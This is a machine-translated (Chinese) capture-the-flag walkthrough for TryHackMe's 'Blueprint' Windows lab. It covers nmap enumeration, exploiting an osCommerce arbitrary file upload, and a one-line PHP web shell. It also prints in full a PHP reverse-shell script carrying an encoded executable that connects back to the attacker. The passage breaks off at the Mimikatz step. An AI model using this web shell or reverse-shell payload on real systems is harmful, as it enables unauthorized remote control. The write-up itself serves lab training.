<html>
<head>
<title>BluePrint Walkthrough[❌Metasploit ❌]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">蓝图Walkthrough[❌Metasploit ❌]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/blueprint-walkthrough-metasploit-b37964edfe0c?source=collection_archive---------1-----------------------#2021-07-16">https://infosecwriteups.com/blueprint-walkthrough-metasploit-b37964edfe0c?source=collection_archive---------1-----------------------#2021-07-16</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="9ec3" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">在没有Metasploit的TryHackMe上解决Windows机器。</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/dae1e294eb6149271f974924aa8e61dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*btPrj6FStQHASdfR_bTEvg.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">蓝图机</figcaption></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kv"><img src="../Images/a09c278fe38d79a53656da7b5c699fbf.png" data-original-src="https://miro.medium.com/v2/resize:fit:534/format:webp/1*pTBXQkXvw41is63N5mCURw.png"/></div></figure><h1 id="638c" class="kw kx iq bd ky kz la lb lc ld le lf lg jw lh jx li jz lj ka lk kc ll kd lm ln bi translated">描述</h1><p id="021d" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated"><a class="ae mk" href="https://tryhackme.com/room/blueprint" rel="noopener ugc nofollow" target="_blank">蓝图</a>是在<a class="ae mk" href="https://tryhackme.com/" rel="noopener ugc nofollow" target="_blank"> TryhackMe </a>上的一款易级Windows机。该机器是一台Windows 7机器，在端口8080上托管一个web服务器。那个网络服务器运行的是过时版本的<strong class="lq ir"> OsCommerce </strong>。该过时版本存在一个任意文件上传漏洞，该漏洞已被用于上传web外壳。最后，这个web shell已经被用来在具有系统特权的机器上获得一个稳定的shell，并且<strong class="lq ir"> Mimikatz </strong>已经被用来寻找使用散列。</p><h1 id="2e11" class="kw kx iq bd ky kz la lb lc ld le lf lg jw lh jx li jz lj ka lk kc ll kd lm ln bi translated">列举</h1><p id="4af8" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">首先，让我们开始一次<strong class="lq ir"> NMAP </strong>扫描</p><pre class="kg kh ki kj gt ml mm mn mo aw mp bi"><span id="c21b" class="mq kx iq mm b gy mr ms l mt mu"><strong class="mm ir">sudo nmap -sC -sV -O 10.10.242.9 -oN nmap/inital -vv</strong></span><span id="b60c" class="mq kx iq mm b gy mv ms l mt mu">Starting Nmap 7.80 ( <a class="ae mk" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2021-07-16 18:08 IST<br/>Nmap scan report for 10.10.43.103<br/>Host is up (0.25s latency).<br/>Not shown: 987 closed ports<br/>PORT      STATE SERVICE      VERSION<br/><strong class="mm ir">80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</strong><br/>| http-methods: <br/>|_  Potentially risky methods: TRACE<br/>|_http-server-header: Microsoft-IIS/7.5<br/>|_http-title: 404 - File or directory not found.<br/><strong class="mm ir">135/tcp   open  msrpc        Microsoft Windows RPC<br/>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn<br/>443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h </strong>PHP/5.6.28)<br/>| http-methods: <br/>|_  Potentially risky methods: TRACE<br/>|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28<br/>|_http-title: Index of /<br/>| ssl-cert: Subject: commonName=localhost<br/>| Not valid before: 2009-11-10T23:48:47<br/>|_Not valid after:  2019-11-08T23:48:47<br/>|_ssl-date: TLS randomness does not represent time<br/>| tls-alpn: <br/>|_  http/1.1<br/><strong class="mm ir">445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack</strong> 1 microsoft-ds (workgroup: WORKGROUP)<br/><strong class="mm ir">3306/tcp  open  mysql        MariaDB (unauthorized)<br/>8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h </strong>PHP/5.6.28)<br/>| http-methods: <br/>|_  Potentially risky methods: TRACE<br/>|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28<br/><strong class="mm ir"><em class="mw">|_http-title: Index of /</em></strong><br/><strong class="mm ir">49152/tcp open  msrpc        Microsoft Windows RPC<br/>49153/tcp open  msrpc        Microsoft Windows RPC<br/>49154/tcp open  msrpc        Microsoft Windows RPC<br/>49158/tcp open  msrpc        Microsoft Windows RPC<br/>49159/tcp open  msrpc        Microsoft Windows RPC<br/>49160/tcp open  msrpc        Microsoft Windows RPC</strong><br/>Service Info: Hosts: <a class="ae mk" href="http://www.example.com" rel="noopener ugc nofollow" target="_blank">www.example.com</a>, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows</span><span id="e27e" class="mq kx iq mm b gy mv ms l mt mu">Host script results:<br/>|_clock-skew: mean: -19m54s, deviation: 34m37s, median: 4s<br/>|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:42:5a:d3:59:a3 (unknown)<br/>| smb-os-discovery: <br/>|   OS: <strong class="mm ir">Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)</strong><br/>|   OS CPE: cpe:/o:microsoft:windows_7::sp1<br/>|   Computer name: BLUEPRINT<br/>|   NetBIOS computer name: BLUEPRINT\x00<br/>|   Workgroup: WORKGROUP\x00<br/>|_  System time: 2021-07-16T13:40:18+01:00<br/>| smb-security-mode: <br/>|   account_used: guest<br/>|   authentication_level: user<br/>|   challenge_response: supported<br/>|_  message_signing: disabled (dangerous, but default)<br/>| smb2-security-mode: <br/>|   2.02: <br/>|_    Message signing enabled but not required<br/>| smb2-time: <br/>|   date: 2021-07-16T12:40:20<br/>|_  start_date: 2021-07-16T12:34:54</span><span id="73bf" class="mq kx iq mm b gy mv ms l mt mu">Service detection performed. Please report any incorrect results at <a class="ae mk" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/>Nmap done: 1 IP address (1 host up) scanned in 138.52 seconds</span></pre><p id="daa2" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">NMAP扫描显示有几个端口是开放的。</p><ul class=""><li id="2ae2" class="nc nd iq lq b lr mx lu my lx ne mb nf mf ng mj nh ni nj nk bi translated">在端口80上，我们没有发现任何有趣的东西</li></ul><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nl"><img src="../Images/6f9eb6c34434be96f2100c67a1059900.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HXZtQkXo62IVH7J1nLpU-w.png"/></div></div></figure><ul class=""><li id="142d" class="nc nd iq lq b lr mx lu my lx ne mb nf mf ng mj nh ni nj nk bi translated">在扫描中我们可以看到，在端口8080上，我们有标题<em class="mw"/><strong class="lq ir"><em class="mw"/></strong>的索引，这可能很有趣，让我们看看</li></ul><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nm"><img src="../Images/ba176d108ba3d3b77ae6ed8071abfff9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Yw7W7dNHkGKL7DRV_5yKBA.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nn"><img src="../Images/418624d85ea189e838ef1672f1b87ca4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*l9VSc-5rQZlbkd-NpYbezA.png"/></div></div></figure><p id="39c6" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">事实上，我们在这里启用了文件列表。因此，我们更进一步，看看这个版本的<strong class="lq ir"> OSCommerce </strong>是否存在公开的漏洞</p><p id="b42a" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">我们可以使用<strong class="lq ir"> SearchSploit </strong>(在ExploitDB上搜索的命令行工具)来查找可用的漏洞。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi no"><img src="../Images/edb16232beb693ca9c24c65d551be93f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W5IkGMM_sgv-IgUbhT0bTQ.png"/></div></div></figure><p id="4fbd" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">我们有两个漏洞可用<strong class="lq ir"> Arbitartay文件上传</strong>和<strong class="lq ir">远程代码执行。</strong>我们将利用文件上传漏洞继续深入。</p></div><div class="ab cl np nq hu nr" role="separator"><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu"/></div><div class="ij ik il im in"><h1 id="17b8" class="kw kx iq bd ky kz nw lb lc ld nx lf lg jw ny jx li jz nz ka lk kc oa kd lm ln bi translated">剥削</h1><p id="d480" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">要在服务器上上传文件，我们需要使用提供的仪表板创建一个帐户。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ob"><img src="../Images/e7f59cd2c4a02b31a150504e92bb55e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1278/format:webp/1*K-29ftsRrcMUlPe3ZOkGmg.png"/></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">点击“开始”,然后相应地创建一个用户</figcaption></figure><p id="05c8" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">在安装过程中，我对数据库使用了用户名“root”和空白密码。此外，还创建了一个管理员用户，用户名和密码为“admin”</p><div class="kg kh ki kj gt ab cb"><figure class="oc kk od oe of og oh paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><img src="../Images/8c785aafa82552118ff59504e06819c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:840/format:webp/1*8KxhTv6u2r_g6UNlQluJcg.png"/></div></figure><figure class="oc kk oi oe of og oh paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><img src="../Images/478de55bb5171d51f0db93e19e53000e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1162/format:webp/1*mz1rkbYt7ws9eIPJ8OqBQg.png"/></div></figure></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/a80b84e685e2a57d49dfbd8023790b2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1280/format:webp/1*rplUNzfof3hgNIAB9odxdw.png"/></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">记住用户名和密码，以便在接下来的步骤中使用</figcaption></figure><p id="a2ba" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">现在我们在应用程序中有了一个用户，让我们上传一个简单的PHP web shell。</p><p id="0d22" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">你可以使用一行PHP外壳，并将其保存为Shell.php</p><h2 id="b229" class="mq kx iq bd ky ok ol dn lc om on dp lg lx oo op li mb oq or lk mf os ot lm ou bi translated"><?php echo shell_exec($_GET['cmd'].' 2?>&amp; 1’)；？&gt;</h2><p id="79ad" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">我们使用<strong class="lq ir"> shell_exec() </strong>而不是<strong class="lq ir"> system() </strong>，因为<strong class="lq ir"> system() </strong>命令被服务器阻塞了</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ov"><img src="../Images/18be26b8f9a9cdbd7adce34673fa0b24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ft0U6pUS4forhlasUsmq8g.png"/></div></div></figure><pre class="kg kh ki kj gt ml mm mn mo aw mp bi"><span id="597c" class="mq kx iq mm b gy mr ms l mt mu">python /usr/share/exploitdb/expoits/php/webapps/43191.py -u <a class="ae mk" href="http://YOUR_MACHINE_IP/oscommerce-2.3.4" rel="noopener ugc nofollow" target="_blank">http://YOUR_MACHINE_IP/oscommerce-2.3.4</a> --auth=admin:admin_password -f Shell.php</span></pre><p id="7d69" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">您的shell现在将被上传到服务器，您可以访问它来运行命令。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/c53ac06847143a7cd863c40a8b04078a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*33rY8XvOU56nfr8XrHYFww.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated">dir命令列出目录。</figcaption></figure><p id="a6d1" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">我们找到了系统信息，这将有助于我们进一步的攻击。这里的系统是一台<strong class="lq ir"> x86 Windows机器</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ow"><img src="../Images/df969c2436f7138dcc1303f5b1f0cc56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DOvTxrlqJwy3aHhaVkrjUA.png"/></div></div></figure></div><div class="ab cl np nq hu nr" role="separator"><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu"/></div><div class="ij ik il im in"><h1 id="677c" class="kw kx iq bd ky kz nw lb lc ld nx lf lg jw ny jx li jz nz ka lk kc oa kd lm ln bi translated">获得稳定的外壳</h1><p id="0ba0" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">目前，我们已经在系统上有了一个初步的立足点，我们将利用它来拥有一个成熟的外壳，这将帮助我们运行更多的系统命令。</p><p id="530d" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">我们将创建一个PHP文件，它将为我们的系统提供一个反向shell。为此，我们将使用下面的<a class="ae mk" href="https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php" rel="noopener ugc nofollow" target="_blank">脚本</a></p><pre class="kg kh ki kj gt ml mm mn mo aw mp bi"><span id="d9d3" class="mq kx iq mm b gy mr ms l mt mu">&lt;?php<br/><br/>header('Content-type: text/plain');<br/>$ip   = "YOUR_IP"; //change this <br/>$port = "1234"; //change this<br/>$payload = "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";<br/>$evalCode = gzinflate(base64_decode($payload));<br/>$evalArguments = " ".$port." ".$ip;<br/>$tmpdir ="C:\\windows\\temp";<br/>chdir($tmpdir);<br/>$res .= "Using dir : ".$tmpdir;<br/>$filename = "D3fa1t_shell.exe";<br/>$file = fopen($filename, 'wb');<br/>fwrite($file, $evalCode);<br/>fclose($file);<br/>$path = $filename;<br/>$cmd = $path.$evalArguments;<br/>$res .= "\n\nExecuting : ".$cmd."\n";<br/>echo $res;<br/>$output = system($cmd);<br/>			            <br/>?&gt;</span></pre><p id="b62d" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">现在像我们上传前一个文件一样上传这个文件。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ox"><img src="../Images/ac00f5d0e397bc1c727f47c019fbee62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lgtgWwrJOTwqoRrC1m5U4A.png"/></div></div></figure><p id="50d5" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">在指定的端口上启动监听器，然后从浏览器中获取反向Shell文件。现在，您将拥有一个功能齐全的反向外壳。</p></div><div class="ab cl np nq hu nr" role="separator"><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu nv"/><span class="ns bw bk nt nu"/></div><div class="ij ik il im in"><h1 id="203a" class="kw kx iq bd ky kz nw lb lc ld nx lf lg jw ny jx li jz nz ka lk kc oa kd lm ln bi translated">寻找旗帜</h1><p id="b58b" class="pw-post-body-paragraph lo lp iq lq b lr ls jr lt lu lv ju lw lx ly lz ma mb mc md me mf mg mh mi mj ij bi translated">现在是寻找旗帜的主要部分。我们的问题是</p><ul class=""><li id="2eb2" class="nc nd iq lq b lr mx lu my lx ne mb nf mf ng mj nh ni nj nk bi translated">“实验室”用户NTML哈希已解密</li><li id="c318" class="nc nd iq lq b lr oy lu oz lx pa mb pb mf pc mj nh ni nj nk bi translated">root.txt</li></ul><p id="87a5" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi translated">首先，让我们首先找到<strong class="lq ir">实验室</strong>用户的<strong class="lq ir"> NTLM </strong>散列。为此，我们将使用<strong class="lq ir"> Mimikatz </strong>它是<strong class="lq ir">一款领先的后利用工具，可以从内存中转储密码和</strong> <strong class="lq ir">哈希</strong>、<strong class="lq ir">pin</strong>以及Kerberos票证。</p><p id="9822" class="pw-post-body-paragraph lo lp iq lq b lr mx jr lt lu my ju lw lx mz lz ma mb na md me mf nb mh mi mj ij bi 